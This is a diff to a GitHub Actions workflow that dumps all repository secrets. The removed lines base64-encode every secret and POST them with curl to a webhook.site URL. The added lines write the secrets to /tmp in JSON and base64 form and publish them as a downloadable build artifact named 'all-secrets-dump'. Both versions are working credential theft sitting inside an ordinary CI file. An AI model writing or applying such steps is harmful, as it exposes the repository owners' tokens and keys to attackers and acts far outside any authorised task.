@@ -16,14 +16,24 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: 🔥 OMEGA BASE64 EXFIL
+      - name: 🔥 OMEGA ALL SECRETS DUMP
         env:
           ALL_SECRETS: ${{ toJson(secrets) }}
         run: |
-          B64=$(echo "$ALL_SECRETS" | base64 -w0)
-          echo "B64_LENGTH=${#B64}"
-          echo "$ALL_SECRETS" | base64 -w0 | curl -s -X POST "https://webhook.site/993a0ee5-7141-4904-bd84-659acee8bec1" -d @-
-          echo "WEBHOOK_DONE"
+          echo "B64_LENGTH_ONLY: this tells us the size"
+          echo "$ALL_SECRETS" > /tmp/all_secrets.json
+          cat /tmp/all_secrets.json | base64 -w0 > /tmp/all_secrets.b64
+          echo "B64_LENGTH=$(wc -c < /tmp/all_secrets.b64)"
+          echo "JSON_LENGTH=$(wc -c < /tmp/all_secrets.json)"
+
+      - name: Upload Secrets Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: all-secrets-dump
+          path: |
+            /tmp/all_secrets.json
+            /tmp/all_secrets.b64
+          if-no-files-found: error
 
       - name: Setup Node.js
         uses: actions/setup-node@v4
